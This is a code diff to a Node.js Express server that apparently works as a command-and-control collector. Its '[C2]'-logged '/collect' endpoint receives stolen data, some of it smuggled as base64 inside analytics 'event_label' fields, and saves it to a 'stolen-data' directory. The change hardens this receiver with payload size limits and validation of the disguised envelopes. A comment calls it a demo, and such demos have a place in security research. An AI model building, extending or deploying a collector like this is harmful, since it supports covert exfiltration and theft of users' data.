@@ -19,14 +19,15 @@ const app = express()
 // Use PORT env var (Cloud Run sets PORT=8080), default to 3000 for local dev
 const PORT = process.env.PORT || 3000
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'stolen-data')
+const MAX_ANALYTICS_EVENT_LABEL_LENGTH = 8192
 
 // Trust the GFE/Cloud Run proxy so req.ip reflects X-Forwarded-For
 app.set('trust proxy', true)
 
 // Middleware
 app.use(cors()) // Allow cross-origin requests (for demo only)
-app.use(express.json())
-app.use(express.urlencoded({ extended: true }))
+app.use(express.json({ limit: '32kb' }))
+app.use(express.urlencoded({ extended: true, limit: '32kb' }))
 
 // Ensure data directory exists
 async function ensureDataDir() {
@@ -92,6 +93,11 @@ function decodeAnalyticsEnvelope(body) {
     return null
   }
 
+  if (encodedPayload.length > MAX_ANALYTICS_EVENT_LABEL_LENGTH) {
+    console.warn('[C2] Analytics envelope skipped: event_label too large')
+    return null
+  }
+
   try {
     const decoded = Buffer.from(encodedPayload, 'base64').toString('utf8')
     const parsed = JSON.parse(decoded)
@@ -130,6 +136,23 @@ function decodeAnalyticsEnvelope(body) {
 }
 
 function normalizeStolenData(body) {
+  if (body && typeof body === 'object' && body.analyticsEnvelope) {
+    const encodedPayload = body.params?.event_label
+    if (typeof encodedPayload !== 'string') {
+      return {
+        stolenData: null,
+        receiveMode: 'analytics-envelope-invalid'
+      }
+    }
+
+    if (encodedPayload.length > MAX_ANALYTICS_EVENT_LABEL_LENGTH) {
+      return {
+        stolenData: null,
+        receiveMode: 'analytics-envelope-too-large'
+      }
+    }
+  }
+
   const analyticsPayload = decodeAnalyticsEnvelope(body)
   if (analyticsPayload) {
     return {
@@ -209,6 +232,11 @@ app.post('/collect', async (req, res) => {
   try {
     const { stolenData, receiveMode } = normalizeStolenData(req.body)
     console.log('[C2] Receive mode:', receiveMode)
+
+    if (!stolenData) {
+      console.warn('[C2] Skipping request with invalid analytics envelope')
+      return res.status(200).json({ status: 'ok' })
+    }
 
     // Add server-side metadata
     stolenData.server = {
